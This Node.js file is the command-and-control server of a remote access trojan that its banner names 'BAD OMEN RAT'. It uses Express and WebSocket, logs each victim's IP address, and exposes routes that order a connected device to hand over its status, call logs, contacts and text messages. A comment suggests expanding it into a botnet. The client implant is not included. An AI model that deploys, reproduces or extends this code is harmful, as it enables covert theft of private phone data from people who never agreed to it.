const serverPort = 8080;
const http = require("http");
const express = require("express");

const app = express();

const favicon = require("serve-favicon");
const path = require("path");

//app.use(express.static(path.join(__dirname, 'public')));
app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')))

const server = http.createServer(app);
const WebSocket = require("ws");
const websocketServer = new WebSocket.Server({ server });

// variables for saving all the connectedClients {possible upgrade with a botnet}
var id = 0;
var connectedClients = {};

//when a websocket connection is established
websocketServer.on("connection", (webSocketClient, request) => {
  webSocketClient.id = id++;
  connectedClients[webSocketClient.id] = webSocketClient;

  console.log("Nuova connessione: " + request.socket.remoteAddress);

  //when a message is received
  webSocketClient.on("message", (message) => {
      console.log(message);
  });
});



app.get("/", (req, res) => {
  res.sendFile(path.resolve(__dirname + "/index.html"));
});

// Define the reqStatus route
app.get('/reqStatus', function(req, res) {
  console.log("stat");
  console.log(connectedClients[id-1] != null ? true : false);
  connectedClients[id-1].send('{ "requestType" : "reqStatus"}');
});

// Define the reqCallLogs route
app.get('/reqCallLogs', function(req, res) {
  console.log("calllog");
  console.log(connectedClients[id-1] != null ? true : false);
  connectedClients[id-1].send('{ "requestType" : "reqCallLogs"}');
});

// Define the reqContacts route
app.get('/reqContacts', function(req, res) {
  console.log("contacts");
  console.log(connectedClients[id-1] != null ? true : false);
  connectedClients[id-1].send('{ "requestType" : "reqContacts"}');
});

// Define the reqMessages route
app.get('/reqMessages', function(req, res) {
  console.log("mess");
  console.log(connectedClients[id-1] != null ? true : false);
  connectedClients[id-1].send('{ "requestType" : "reqMessages"}');
});



//start the web server
server.listen(serverPort, () => {
    console.log(`Websocket server started on port ` + serverPort);
    console.log(`
    ██████╗░░█████╗░██████╗░  ░█████╗░███╗░░░███╗███████╗███╗░░██╗  ██████╗░░█████╗░████████╗
    ██╔══██╗██╔══██╗██╔══██╗  ██╔══██╗████╗░████║██╔════╝████╗░██║  ██╔══██╗██╔══██╗╚══██╔══╝
    ██████╦╝███████║██║░░██║  ██║░░██║██╔████╔██║█████╗░░██╔██╗██║  ██████╔╝███████║░░░██║░░░
    ██╔══██╗██╔══██║██║░░██║  ██║░░██║██║╚██╔╝██║██╔══╝░░██║╚████║  ██╔══██╗██╔══██║░░░██║░░░
    ██████╦╝██║░░██║██████╔╝  ╚█████╔╝██║░╚═╝░██║███████╗██║░╚███║  ██║░░██║██║░░██║░░░██║░░░
    ╚═════╝░╚═╝░░╚═╝╚═════╝░  ░╚════╝░╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚══╝  ╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░
                                      By Tosatto Simone Pio`
    )
});